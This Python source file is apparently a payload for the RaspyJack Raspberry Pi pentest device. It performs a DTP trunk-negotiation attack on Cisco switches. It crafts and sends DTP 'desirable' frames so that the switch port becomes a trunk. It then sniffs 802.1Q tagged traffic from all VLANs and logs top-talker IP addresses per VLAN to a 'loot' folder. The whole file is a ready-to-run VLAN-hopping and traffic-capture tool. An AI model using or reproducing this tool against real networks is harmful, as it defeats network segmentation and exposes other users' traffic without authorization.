#!/usr/bin/env python3
"""
RaspyJack Payload -- Trunk Dump
=================================
Author: 7h30th3r0n3

802.1Q trunk negotiation + multi-VLAN traffic dump.
Sends DTP (Dynamic Trunking Protocol) frames to negotiate a trunk
with a Cisco switch, then sniffs tagged traffic from all VLANs.

Flow:
  1) Send DTP frames to negotiate trunk mode
  2) Once trunked, sniff 802.1Q tagged frames
  3) Parse VLAN tags and track per-VLAN statistics
  4) Display VLAN list with traffic counts, drill-down per VLAN

Controls:
  OK        -- Start DTP negotiation
  UP / DOWN -- Scroll VLAN list
  RIGHT     -- Show VLAN details (top talkers)
  KEY2      -- Export data
  KEY3      -- Exit

Loot: /root/Raspyjack/loot/TrunkDump/

Setup: Switch must support DTP (Cisco default on many switches).
"""

import os
import sys
import time
import json
import struct
import threading
import subprocess
from datetime import datetime
from collections import defaultdict

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        sniff, sendp, Ether, Dot1Q, Raw, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/TrunkDump"
os.makedirs(LOOT_DIR, exist_ok=True)
ROWS_VISIBLE = 6

# DTP constants
DTP_MCAST = "01:00:0c:cc:cc:cc"
DTP_SNAP = b"\xaa\xaa\x03\x00\x00\x0c\x20\x04"  # SNAP header for DTP

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
vlan_stats = defaultdict(lambda: {"packets": 0, "bytes": 0, "ips": defaultdict(int)})
vlan_list = []           # sorted VLAN IDs
scroll_pos = 0
selected_vlan = -1
view_mode = "vlans"      # vlans | detail
status_msg = "Ready"
dtp_sent = False
trunk_active = False
sniff_running = False
app_running = True
my_iface = ""
my_mac = ""
total_tagged = 0


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_default_iface():
    try:
        r = subprocess.run(["ip", "route", "show", "default"],
                           capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_iface_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


# ---------------------------------------------------------------------------
# DTP negotiation
# ---------------------------------------------------------------------------

def _build_dtp_frame(src_mac):
    """Build a DTP desirable frame to trigger trunk negotiation."""
    # DTP TLVs: Domain (type 0x0001), Status (type 0x0002), DTP Type (type 0x0003),
    # Neighbor (type 0x0004), padding
    # Status: 0x03 = Desirable, DTP Type: 0x04 = 802.1Q

    domain_tlv = struct.pack(">HH", 0x0001, 5) + b"\x00"
    status_tlv = struct.pack(">HH", 0x0002, 5) + b"\xa5"  # desirable + trunk
    type_tlv = struct.pack(">HH", 0x0003, 5) + b"\xa5"    # 802.1Q preferred
    neighbor_tlv = struct.pack(">HH", 0x0004, 10)
    mac_bytes = bytes(int(b, 16) for b in src_mac.split(":"))
    neighbor_tlv += mac_bytes

    dtp_payload = DTP_SNAP + b"\x01" + domain_tlv + status_tlv + type_tlv + neighbor_tlv

    frame = Ether(src=src_mac, dst=DTP_MCAST, type=len(dtp_payload)) / Raw(load=dtp_payload)
    return frame


def _dtp_thread():
    """Send DTP frames to negotiate trunk."""
    global dtp_sent, trunk_active, status_msg
    with lock:
        status_msg = "Sending DTP frames..."

    for i in range(10):
        if not app_running:
            break
        try:
            frame = _build_dtp_frame(my_mac)
            sendp(frame, iface=my_iface, verbose=False)
        except Exception:
            pass
        time.sleep(1)

    dtp_sent = True
    with lock:
        trunk_active = True
        status_msg = "DTP sent — sniffing tags..."

    # Start sniffing for tagged traffic
    _start_sniff()


# ---------------------------------------------------------------------------
# 802.1Q sniffing
# ---------------------------------------------------------------------------

def _packet_handler(pkt):
    """Process sniffed packet for 802.1Q tags."""
    global total_tagged

    if pkt.haslayer(Dot1Q):
        vlan_id = pkt[Dot1Q].vlan
        pkt_len = len(pkt)

        # Extract IP if present
        src_ip = ""
        try:
            from scapy.all import IP
            if pkt.haslayer(IP):
                src_ip = pkt[IP].src
        except Exception:
            pass

        with lock:
            total_tagged += 1
            stats = vlan_stats[vlan_id]
            stats["packets"] += 1
            stats["bytes"] += pkt_len
            if src_ip:
                stats["ips"][src_ip] += pkt_len
            _rebuild_vlan_list()


def _rebuild_vlan_list():
    """Rebuild sorted VLAN list — call under lock."""
    global vlan_list
    vlan_list = sorted(vlan_stats.keys())


def _start_sniff():
    """Start sniffing for 802.1Q tagged frames."""
    global sniff_running
    sniff_running = True
    try:
        sniff(
            iface=my_iface,
            prn=_packet_handler,
            store=False,
            stop_filter=lambda _: not app_running or not sniff_running,
        )
    except Exception:
        pass
    finally:
        sniff_running = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    global status_msg
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "interface": my_iface,
            "total_tagged_packets": total_tagged,
            "vlans": {},
        }
        for vid, stats in vlan_stats.items():
            data["vlans"][str(vid)] = {
                "packets": stats["packets"],
                "bytes": stats["bytes"],
                "top_talkers": sorted(
                    stats["ips"].items(), key=lambda x: x[1], reverse=True,
                )[:10],
            }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"trunk_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            status_msg = "Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _fmt_bytes(b):
    if b >= 1_000_000:
        return f"{b / 1_000_000:.1f}M"
    if b >= 1_000:
        return f"{b / 1_000:.1f}K"
    return f"{b}B"


def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)
    draw.text((2, 2), "TRUNK DUMP", fill="CYAN", font=font)

    with lock:
        st = status_msg
        vl = list(vlan_list)
        sp = scroll_pos
        sv = selected_vlan
        tt = total_tagged
        vm = view_mode
        vs = dict(vlan_stats)
        ta = trunk_active

    draw.text((80, 2), f"T:{tt}", fill="YELLOW", font=font)
    draw.text((2, 14), st[:22], fill="WHITE", font=font)

    if vm == "vlans":
        y = 28
        for i, vid in enumerate(vl[sp:sp + ROWS_VISIBLE]):
            real_i = sp + i
            stats = vs.get(vid, {"packets": 0, "bytes": 0})
            prefix = ">" if vid == sv else " "
            color = "YELLOW" if vid == sv else "WHITE"
            line = f"{prefix}VLAN {vid:<4} {stats['packets']:>5}p {_fmt_bytes(stats['bytes'])}"
            draw.text((2, y), line[:22], fill=color, font=font)
            y += 14

        if not vl:
            if ta:
                draw.text((2, 56), "No tagged traffic yet", fill="GRAY", font=font)
            else:
                draw.text((2, 56), "Press OK to start DTP", fill="GRAY", font=font)
        draw.text((2, 116), "OK=DTP R=detail K3=ex", fill="GRAY", font=font)

    elif vm == "detail":
        draw.text((2, 28), f"VLAN {sv}", fill="YELLOW", font=font)
        stats = vs.get(sv, {"packets": 0, "bytes": 0, "ips": {}})
        draw.text((2, 42), f"Pkts: {stats['packets']}", fill="WHITE", font=font)
        draw.text((2, 56), f"Bytes: {_fmt_bytes(stats['bytes'])}", fill="WHITE", font=font)

        # Top talkers
        ips = stats.get("ips", {})
        top = sorted(ips.items(), key=lambda x: x[1], reverse=True)[:3]
        y = 72
        for ip, bcount in top:
            draw.text((2, y), f"{ip} {_fmt_bytes(bcount)}"[:22], fill="GREEN", font=font)
            y += 14
        draw.text((2, 116), "OK=back K3=exit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global app_running, scroll_pos, selected_vlan, view_mode
    global status_msg, my_iface, my_mac, sniff_running

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="RED")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    my_iface = _get_default_iface()
    my_mac = _get_iface_mac(my_iface)

    try:
        _draw_screen()

        while app_running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                app_running = False
                break

            elif btn == "OK":
                with lock:
                    vm = view_mode
                if vm == "detail":
                    with lock:
                        view_mode = "vlans"
                        scroll_pos = 0
                elif not trunk_active:
                    threading.Thread(target=_dtp_thread, daemon=True).start()

            elif btn == "UP":
                with lock:
                    if view_mode == "vlans":
                        if scroll_pos > 0:
                            scroll_pos -= 1
                        idx = scroll_pos
                        if idx < len(vlan_list):
                            selected_vlan = vlan_list[idx]

            elif btn == "DOWN":
                with lock:
                    if view_mode == "vlans":
                        max_s = max(0, len(vlan_list) - ROWS_VISIBLE)
                        if scroll_pos < max_s:
                            scroll_pos += 1
                        idx = min(scroll_pos, len(vlan_list) - 1)
                        if idx >= 0 and idx < len(vlan_list):
                            selected_vlan = vlan_list[idx]

            elif btn == "RIGHT":
                with lock:
                    if view_mode == "vlans" and selected_vlan in vlan_stats:
                        view_mode = "detail"
                        scroll_pos = 0

            elif btn == "KEY2":
                threading.Thread(target=_export_data, daemon=True).start()

            _draw_screen()
            time.sleep(0.15)

    finally:
        app_running = False
        sniff_running = False
        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 50), "Trunk dump stopped", fill="YELLOW", font=font)
            d.text((10, 66), f"VLANs: {len(vlan_list)}", fill="WHITE", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass
        GPIO.cleanup()


if __name__ == "__main__":
    main()
